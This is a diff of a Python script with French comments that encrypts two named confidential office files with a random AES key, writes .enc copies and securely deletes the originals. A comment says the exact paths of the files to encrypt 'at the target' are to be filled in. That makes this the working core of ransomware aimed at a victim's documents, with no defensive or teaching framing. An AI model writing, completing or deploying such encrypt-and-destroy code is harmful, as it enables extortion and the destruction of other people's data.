@@ -23,23 +23,25 @@ def secure_delete(file_path):
         os.remove(file_path)
     except Exception as e:
         print(f"Erreur lors de la suppression sécurisée de {file_path}: {e}")
+        
+if __name__ == '__main__':
+    keyfile_path = "keyfile.key"
+    try:
+        key = load_key(keyfile_path)
+    except Exception as e:
+        print(f"Error loading key: {e}")
+        key = get_random_bytes(32)
+        save_key(key, keyfile_path)
+        
+    # Ici on devra mettre le path exact des fichiers qu'on cherche à chiffrer chez la cible
+    files_to_encrypt = ["dossier_confidentiel/Contrat_de_Prestation.docx", "dossier_confidentiel/Achats_Fournitures.xlsx"]
 
-keyfile_path = "keyfile.key"
-
-if not os.path.exists(keyfile_path):
-    key = get_random_bytes(32)
-    save_key(key, keyfile_path)
-else:
-    key = load_key(keyfile_path) 
-    
-files_to_encrypt = ["dossier_confidentiel/Contrat_de_Prestation.docx", "dossier_confidentiel/Achats_Fournitures.xlsx"]
-
-encrypted_files = {}
-for file_path in files_to_encrypt:
-    ciphertext = encrypt_file(file_path, key)
-    encrypted_file_path = file_path + ".enc"
-    with open(encrypted_file_path, 'wb') as f:
-        f.write(ciphertext)
-    encrypted_files[file_path] = encrypted_file_path
-    secure_delete(file_path)
+    encrypted_files = {}
+    for file_path in files_to_encrypt:
+        ciphertext = encrypt_file(file_path, key)
+        encrypted_file_path = file_path + ".enc"
+        with open(encrypted_file_path, 'wb') as f:
+            f.write(ciphertext)
+        encrypted_files[file_path] = encrypted_file_path
+        secure_delete(file_path)
 
